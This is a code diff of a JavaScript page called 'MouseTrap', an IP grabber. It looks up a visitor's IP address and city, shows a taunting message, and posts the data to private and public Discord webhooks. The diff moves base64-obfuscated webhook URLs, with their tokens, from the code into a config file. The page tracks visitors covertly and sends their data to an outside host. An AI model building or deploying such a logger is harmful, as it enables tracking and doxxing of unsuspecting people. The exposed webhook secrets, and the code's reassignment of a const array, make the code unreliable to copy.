@@ -26,9 +26,33 @@
         client = urlParams.get('client');
         const PROD = true;
 
+        // Getting the private and public webhook URLs from config.json
+        async function getConfig() {
+            try {
+                const response = await fetch('config.json');
+                const config = await response.json();
+                return config;
+            } catch (error) {
+                console.error('Error fetching config:', error);
+                return null;
+            }
+        }
+
         // Main Class
         class MouseTrap {
+            static privateWebhookURL = "";
+            static publicWebhookURL = "";
+
+
             static async start() {
+
+                getConfig().then(config => {
+                    if (config) {
+                        MouseTrap.privateWebhookURL = config.privateWebhookURL;
+                        MouseTrap.publicWebhookURL = config.publicWebhookURL;
+                    }
+                });
+
                 let ip;
 
                 // Api Calls
@@ -49,7 +73,7 @@
                     // Update view
                     let $loc = document.getElementById("loc");
                     $loc.innerHTML = 'O Ratão está em ' + geoData.location.principalSubdivision + ", " + geoData.location.localityName + "!";
-                    
+
                     // Loggers
                     if (PROD) {
                         if (client && client.toLowerCase() !== "desconhecido") {
@@ -66,9 +90,6 @@
 
             // Private logger
             static privateLogger(json) {
-                let u =
-                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==";
-
                 const embed = {
                     color: MouseTrap.stringToColorDecimal(client || "Desconhecido"),
                     fields: [
@@ -116,15 +137,14 @@
                     ],
                 };
 
-                MouseTrap.sendMessage(u, embed);
+                MouseTrap.sendMessage(MouseTrap.privateWebhookURL, embed);
             }
 
             // Public logger
             static publicLogger(json) {
-                let wh =
-                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM1MDAwMDc4NzI5NjI1Ni9FN1ZDSFUtZDF2Y1dqZ2libTJFOFpMTXJNTkc5Mzg3UG5MTFBYMGlPcFFRekJGSHhMdDVvSHZTODllSjhaSzNMQy0zbA==";
+
                 const arr = json.ip.split(".");
-                if(arr.length === 1){
+                if (arr.length === 1) {
                     arr = json.ip.split(":");
                 }
                 const ofuscatedIp = arr.length > 4 ?
@@ -144,7 +164,7 @@
                     },
                 };
 
-                MouseTrap.sendMessage(wh, params);
+                MouseTrap.sendMessage(MouseTrap.publicWebhookURL, params);
 
             }
 
